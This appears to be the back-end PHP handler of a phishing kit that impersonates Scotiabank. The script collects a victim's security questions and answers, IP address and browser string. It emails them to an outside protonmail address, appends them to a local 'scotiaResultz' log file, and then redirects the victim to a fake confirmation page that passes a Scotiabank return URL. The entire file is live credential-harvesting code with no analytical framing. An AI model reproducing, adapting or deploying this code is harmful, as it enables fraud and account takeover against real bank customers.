<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------2 QuestionDetails------------\n";
$message .= "#Q1		: ".$_POST['Q1']."\n";
$message .= "#A1		: ".$_POST['A1']."\n";
$message .= "#Q2		: ".$_POST['Q2']."\n";
$message .= "#A2		: ".$_POST['A2']."\n";
$message .= "#Q3		: ".$_POST['Q3']."\n";
$message .= "#A3		: ".$_POST['A3']."\n";
$message .= "------created by medpage[679849675]-----------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------SCOTIARESULTS----------------\n";
$send = "world009@protonmail.com";
$subject = "scotiaResultz 2 ".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('scotiaResultz.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script type="text/javascript">
    window.top.location.href = "indexxx.html?page=%2Fuser-management%2Fconfirmation&setLng=en&returnURL=https%3A%2F%2Fwww1.scotiaonline.scotiabank.com%2Fonline%2Fauthentication%2Fauthentication.bns%3Flanguage%3DEnglish";

</script>